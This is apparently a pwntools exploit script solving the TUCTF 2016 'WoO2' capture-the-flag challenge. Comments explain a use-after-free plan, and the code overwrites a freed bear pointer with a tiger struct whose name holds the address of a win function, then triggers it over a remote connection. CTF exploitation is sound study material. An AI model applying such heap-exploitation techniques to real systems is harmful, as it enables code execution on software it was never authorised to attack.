
################################################################################
# REFS:
#       - https://losfuzzys.github.io/writeup/2016/05/16/tuctf2016-WoO/
#       - https://advancedpersistentjest.com/2016/05/17/writeup-woo-woo2-woo2-fixed-tuctf/
################################################################################

################################################################################
# NOTE: 
#       Program is the same as WoO except bearOffset is now initialized to -1
################################################################################


################################################################################
# GOAL: Replace 0xdeadbeef with address of l33tH4x0r (0x4008dd)
################################################################################


################################################################################
# PLAN: Use After Free (UAF Vulnerability)
#       - bearOffset is initialized to -1
#       - makeBear x 2; bearOffset is incremented to 1
#         because we cannot delete the first animal, we need to create 2 bears
#         deleteAnimal checks that index is 0 < index <= 4
#       - deleteBear; this frees bear pointer at index 1 but does not nullify
#         bear's pointer in "pointers" array
#       - makeTiger with l33tH4x0r address as name; because bear's pointer is
#         freed, it gets reused to make tiger. Now bear's pointer is pointing
#         at tiger's struct and bearOffset whic is used in pwnMe is still 
#         pointing to bear's pointer.
#       - Input 0xl337 = 4919 to call pwnMe
################################################################################


from pwn import *

vulnbin = "503b8ee65d7e768e81ee95b7ce14b2a903abb5c7"  # WoO2
velf = ELF(vulnbin)

vp = remote("192.168.2.170", 7331)  # WoO
#vp = process(vulnbin)

# Start process
calltarget = velf.symbols["l33tH4x0r"]
malcontent = p64(calltarget)

# Make 2 bears
for i in range(2):
    vp.recvuntil("Enter your choice:")
    vp.sendline("3") # Bring a bear
    vp.recvuntil("2: Brown Bear")
    vp.sendline("3") # Doesn't matter, this gets overwritten
    vp.recvuntil("Enter the bear's name:")
    vp.sendline("Smokey") # Doesn't matter, this gets overwritten

# Delete bear
vp.recvuntil("Enter your choice:")
vp.sendline("4") # Delete Animal
vp.recvuntil("Which element do you want to delete?")
vp.sendline("1") # Delete bear #2 @ index 1

# Make tiger
vp.recvuntil("Enter your choice:")
vp.sendline("2") # Bring a tiger
vp.recvuntil("4: Caspian Tiger")
vp.sendline("3") # pwnMe checks for bear type 3 
vp.recvuntil("Enter name of tiger:")
vp.sendline(malcontent) # this address gets called in pwnMe

# Trigger pwnMe
vp.recvuntil("Enter your choice:")
vp.sendline(str(0x1337))


#vp.interactive()
vp.clean_and_log()
vp.close()
